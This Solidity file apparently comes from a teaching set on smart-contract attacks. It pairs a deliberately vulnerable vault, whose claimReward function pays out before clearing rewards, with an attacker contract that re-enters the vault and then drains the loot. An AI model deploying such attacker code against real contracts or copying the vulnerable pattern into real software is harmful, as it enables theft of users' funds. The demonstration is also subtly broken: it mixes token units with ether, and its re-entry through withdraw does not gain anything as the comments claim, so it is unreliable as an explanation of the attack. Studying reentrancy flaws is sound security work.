// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./ERC20.sol";

// Attack 2: Cross-Function Reentrancy
// The vulnerability exists across multiple functions that share state
contract CrossFunctionVault {
    ERC20 public stakingToken;
    mapping(address => uint256) public balances;
    mapping(address => uint256) public rewards;
    
    bool private locked;
    
    modifier noReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }
    
    constructor(address _stakingToken) {
        stakingToken = ERC20(_stakingToken);
    }
    
    function deposit(uint256 amount) external {
        stakingToken.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
        rewards[msg.sender] += amount / 10; // 10% reward
    }
    
    // Protected by reentrancy guard
    function withdraw(uint256 amount) external noReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");
        
        balances[msg.sender] -= amount;
        
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
    
    // VULNERABLE: Not protected, shares state with withdraw()
    function claimReward() external {
        uint256 reward = rewards[msg.sender];
        require(reward > 0, "No rewards");
        
        // External call BEFORE state update
        (bool success, ) = msg.sender.call{value: reward}("");
        require(success, "Transfer failed");
        
        // Attacker can re-enter withdraw() here!
        rewards[msg.sender] = 0;
    }
    
    receive() external payable {}
}

contract CrossFunctionAttacker {
    CrossFunctionVault public vault;
    IERC20 public token;
    uint256 public attackCount;
    
    constructor(address _vault, address _token) {
        vault = CrossFunctionVault(_vault);
        token = IERC20(_token);
    }
    
    receive() external payable {
        // Called during claimReward()
        // Re-enter through withdraw() which has separate guard!
        if (attackCount < 3 && address(vault).balance >= 0.1 ether) {
            attackCount++;
            vault.withdraw(0.1 ether);
        }
    }
    
    function attack() external {
        // Setup
        token.approve(address(vault), 1e18);
        vault.deposit(1e18);
        
        // Trigger cross-function reentrancy
        vault.claimReward();
    }
    
    function withdrawLoot() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
